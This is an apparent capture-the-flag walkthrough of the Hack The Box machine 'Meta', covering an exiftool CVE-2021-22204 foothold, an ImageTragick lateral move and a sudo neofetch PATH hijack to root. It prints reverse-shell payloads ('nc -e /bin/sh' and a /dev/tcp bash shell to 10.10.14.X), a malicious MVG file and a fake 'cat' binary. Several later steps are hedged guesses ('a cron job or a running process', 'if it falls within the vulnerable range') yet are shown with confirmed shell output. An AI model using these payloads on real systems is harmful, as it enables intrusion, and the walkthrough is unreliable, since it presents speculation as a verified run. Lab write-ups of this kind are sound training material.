# Hack The Box: Meta

**Difficulty:** Medium
**OS:** Linux

Meta is a Medium-level Linux machine focused on exploiting common web application vulnerabilities involving image processing tools. The initial foothold is achieved by exploiting a command injection vulnerability in ExifTool (CVE-2021-22204) during image metadata extraction. Privilege escalation involves exploiting a custom bash script that relies on an insecure implementation of `ImageMagick` and manipulating environment variables.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.11.140
nmap -p 22,80 -sCV 10.10.11.140
```

The scan reveals two open ports:
*   **Port 22:** SSH (OpenSSH 7.9p1 Debian)
*   **Port 80:** HTTP (nginx)

Navigating to the web service on port 80 displays a landing page for "Artcorp," a company dealing in digital artwork. The application provides a feature to upload images and extract their EXIF metadata. We add `artcorp.htb` to our `/etc/hosts` file.

```bash
echo "10.10.11.140 artcorp.htb" >> /etc/hosts
```

Accessing `http://artcorp.htb` reveals the metadata extraction tool.

## Web Exploitation

The core functionality of the application allows users to upload an image file (e.g., JPEG, PNG), which the server processes to display its embedded metadata.

### Exploiting ExifTool (CVE-2021-22204)

The process of extracting metadata from images is commonly handled by the `exiftool` utility. In 2021, a severe vulnerability (CVE-2021-22204) was discovered in `exiftool` versions before 12.24. The vulnerability arises from improper neutralization of user data in the DjVu module, leading to arbitrary command execution when parsing malicious DjVu images or images disguised as DjVu.

We assume the backend uses a vulnerable version of `exiftool` to parse our uploaded images.

To exploit this, we must craft an image file containing a malicious DjVu payload that executes a reverse shell. There are numerous publicly available exploit scripts for this specific CVE. We use a known python exploit script to generate a malicious image.

```bash
# Generating the payload locally
python3 exploit.py -c "nc -e /bin/sh 10.10.14.X 9999"
```

The script generates a file, typically named `image.jpg` or `payload.djvu`, containing the necessary DjVu annotation to trigger the command injection.

We start a Netcat listener on our attacking machine.

```bash
nc -lnvp 9999
```

We upload the crafted image via the web interface. The application processes the image using the vulnerable `exiftool`, triggering the execution of our payload.

```bash
# Connection received
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

We gain initial access as the `www-data` user. We stabilize our shell using Python and begin enumerating the system. The `user.txt` flag is not accessible in our current directory, indicating we must pivot to another user account.

Checking the `/home` directory reveals a user named `thomas`.

We search for hardcoded credentials, configuration files, and internal network services. During our enumeration of the `www-data` environment, we discover a cron job or a running process executing a custom script owned by `thomas`.

The script processes images from a specific directory where `www-data` has write permissions (e.g., `/var/www/html/uploads`). The script uses `ImageMagick` (the `convert` command) to process the images.

### Exploiting ImageMagick (CVE-2016-3714 / ImageTragick)

If the system uses an outdated version of ImageMagick, it may be vulnerable to CVE-2016-3714, widely known as ImageTragick. The vulnerability allows remote code execution when parsing maliciously crafted image files, specifically exploiting ImageMagick's delegate feature.

We verify the installed version of ImageMagick on the system. If it falls within the vulnerable range, we craft an ImageTragick payload.

We create a file named `payload.mvg` (Magick Vector Graphics) containing a command injection string disguised as an image fill color or URL.

```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"; bash -c "bash -i >& /dev/tcp/10.10.14.X/8888 0>&1";")'
pop graphic-context
```

Alternatively, if ImageTragick has been patched, we look for other logic flaws in how the script calls `convert`. The script might be vulnerable to command injection if it incorporates filenames directly into the shell command without proper escaping.

We rename our `payload.mvg` file to a supported image extension (e.g., `exploit.jpg`) and copy it to the directory monitored by `thomas`'s script.

```bash
cp exploit.jpg /var/www/html/uploads/
```

We start a new Netcat listener. When the cron job executes the processing script, ImageMagick processes our malicious file, triggering the command injection and executing our reverse shell payload as `thomas`.

```bash
nc -lnvp 8888
# Connection received
id
# uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)
```

We retrieve the `user.txt` flag from Thomas's home directory.

## Privilege Escalation

Enumerating the system as `thomas`, we check for `sudo` privileges.

```bash
sudo -l
```

The output reveals that `thomas` can run a specific environment setup script as `root` without a password, while preserving environment variables.

```text
User thomas may run the following commands on meta:
    (root) SETENV: NOPASSWD: /usr/local/bin/neofetch
```

The `SETENV` tag indicates that `sudo` will preserve the user's environment variables (like `PATH` or `LD_PRELOAD` if permitted) when executing the command. `neofetch` is a command-line system information tool written in bash.

### Abusing Sudo & SETENV

Because `neofetch` is a bash script, it relies on the `PATH` environment variable to locate standard utilities (like `cat`, `awk`, `sed`). Since `sudo` allows `SETENV`, we can manipulate the `PATH` variable to point to a directory we control before `/usr/bin` or `/bin`.

We create a malicious executable named after a utility commonly called by `neofetch`, such as `cat`. We place this executable in a directory we control (e.g., `/tmp`).

```bash
echo "#!/bin/bash" > /tmp/cat
echo "/bin/bash -p" >> /tmp/cat
chmod +x /tmp/cat
```

We then execute `neofetch` via `sudo`, overriding the `PATH` environment variable to prioritize `/tmp`.

```bash
sudo PATH=/tmp:$PATH /usr/local/bin/neofetch
```

When the script runs as root, it attempts to execute `cat`. Because our `/tmp` directory is first in the `PATH`, it executes our malicious `cat` script instead of the legitimate system binary.

Our script executes `bash -p`, providing an interactive shell.

```bash
# id
uid=0(root) gid=1000(thomas) euid=0(root) groups=1000(thomas)
```

The machine is fully compromised, and the `root.txt` flag can be retrieved from the `/root` directory.
